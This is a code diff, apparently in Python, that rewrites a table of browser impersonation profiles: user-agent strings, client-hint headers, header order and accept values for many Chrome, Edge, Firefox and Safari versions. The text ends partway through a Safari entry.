-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 117 (Windows)",
-        "identifier": "chrome_117",
-        "impersonate": "chrome117",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Firefox 132 (Windows)",
-        "identifier": "firefox_132",
-        "impersonate": "firefox132",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Firefox 123 (Windows)",
-        "identifier": "firefox_123",
-        "impersonate": "firefox123",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 120 (Windows)",
-        "identifier": "firefox_120",
-        "impersonate": "firefox120",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 117 (Windows)",
-        "identifier": "firefox_117",
-        "impersonate": "firefox117",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 110 (Windows)",
-        "identifier": "firefox_110",
-        "impersonate": "firefox110",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 108 (Windows)",
-        "identifier": "firefox_108",
-        "impersonate": "firefox108",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 106 (Windows)",
-        "identifier": "firefox_106",
-        "impersonate": "firefox106",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 105 (Windows)",
-        "identifier": "firefox_105",
-        "impersonate": "firefox105",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 104 (Windows)",
-        "identifier": "firefox_104",
-        "impersonate": "firefox104",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Firefox 102 (Windows)",
-        "identifier": "firefox_102",
-        "impersonate": "firefox102",
-        "header_order": ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.5", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Safari 16.0 (macOS)",
-        "identifier": "safari_16_0",
-        "impersonate": "safari16_0",
-        "header_order": ["host","accept","sec-fetch-site","sec-fetch-dest","accept-language","sec-fetch-mode","user-agent","referer","accept-encoding","cookie"],
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Safari iOS 16.0",
-        "identifier": "safari_ios_16_0",
-        "impersonate": "safari16_0",
-        "header_order": ["host","sec-fetch-dest","user-agent","accept","referer","sec-fetch-site","sec-fetch-mode","accept-language","accept-encoding","cookie"],
-        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Safari iOS 15.5",
-        "identifier": "safari_ios_15_5",
-        "impersonate": "safari15_5",
-        "header_order": ["host","sec-fetch-dest","user-agent","accept","referer","sec-fetch-site","sec-fetch-mode","accept-language","accept-encoding","cookie"],
-        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
+    # ── Chrome (newest → oldest) ──────────────────────────────────────────────
+    {"name":"Chrome 133a (Windows)","identifier":"chrome_133a","impersonate":"chrome133a","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 133 (macOS)","identifier":"chrome_133_mac","impersonate":"chrome133","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',"sec_ch_ua_platform":'"macOS"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 132 (Windows)","identifier":"chrome_132","impersonate":"chrome132","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 131 (Windows)","identifier":"chrome_131","impersonate":"chrome131","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 130 (Windows)","identifier":"chrome_130","impersonate":"chrome130","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 129 (Windows)","identifier":"chrome_129","impersonate":"chrome129","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 128 (Windows)","identifier":"chrome_128","impersonate":"chrome128","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 127 (Windows)","identifier":"chrome_127","impersonate":"chrome127","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 126 (Windows)","identifier":"chrome_126","impersonate":"chrome126","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 124 (macOS)","identifier":"chrome_124","impersonate":"chrome124","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',"sec_ch_ua_platform":'"macOS"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 123 (Windows)","identifier":"chrome_123","impersonate":"chrome123","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 120 (Windows)","identifier":"chrome_120","impersonate":"chrome120","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 119 (Windows)","identifier":"chrome_119","impersonate":"chrome119","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Chrome 116 (Windows)","identifier":"chrome_116","impersonate":"chrome116","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 110 (Windows)","identifier":"chrome_110","impersonate":"chrome110","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 107 (Windows)","identifier":"chrome_107","impersonate":"chrome107","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="107", "Not=A?Brand";v="24", "Google Chrome";v="107"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 104 (Windows)","identifier":"chrome_104","impersonate":"chrome104","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+     "sec_ch_ua":'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 101 (Windows)","identifier":"chrome_101","impersonate":"chrome101","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
+     "sec_ch_ua":'" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 100 (Windows)","identifier":"chrome_100","impersonate":"chrome100","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
+     "sec_ch_ua":'" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Chrome 99 (Windows)","identifier":"chrome_99","impersonate":"chrome99","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36",
+     "sec_ch_ua":'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    # ── Edge ─────────────────────────────────────────────────────────────────
+    {"name":"Edge 132 (Windows)","identifier":"edge_132","impersonate":"edge101","header_order":_CH_HDRA,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
+     "sec_ch_ua":'"Microsoft Edge";v="132", "Chromium";v="132", "Not A(Brand";v="24"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Edge 99 (Windows)","identifier":"edge_99","impersonate":"edge99","header_order":_CH_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36 Edg/99.0.0.0",
+     "sec_ch_ua":'" Not A;Brand";v="99", "Chromium";v="99", "Microsoft Edge";v="99"',"sec_ch_ua_platform":'"Windows"',"sec_ch_ua_mobile":"?0",
+     "accept_nav":_CH,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    # ── Firefox ──────────────────────────────────────────────────────────────
+    {"name":"Firefox 135 (Windows)","identifier":"firefox_135","impersonate":"firefox135","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Firefox 133 (Windows)","identifier":"firefox_133","impersonate":"firefox133","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br, zstd"},
+    {"name":"Firefox 123 (Windows)","identifier":"firefox_123","impersonate":"firefox123","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 120 (Windows)","identifier":"firefox_120","impersonate":"firefox120","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 117 (Windows)","identifier":"firefox_117","impersonate":"firefox117","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 109 (Windows)","identifier":"firefox_109","impersonate":"firefox109","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 102 (Windows)","identifier":"firefox_102","impersonate":"firefox102","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 100 (Windows)","identifier":"firefox_100","impersonate":"firefox100","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_FF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 98 (Windows)","identifier":"firefox_98","impersonate":"firefox98","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+     "accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    {"name":"Firefox 91 ESR (Windows)","identifier":"firefox_91esr","impersonate":"firefox91esr","header_order":_FF_HDR,
+     "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+     "accept_api":"*/*","accept_lang":"en-US,en;q=0.5","accept_encoding":"gzip, deflate, br"},
+    # ── Safari macOS ─────────────────────────────────────────────────────────
+    {"name":"Safari 18.2 (macOS)","identifier":"safari_18_2","impersonate":"safari18_2","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 18.0 (macOS)","identifier":"safari_18","impersonate":"safari18","header_order":_SF_HDR,
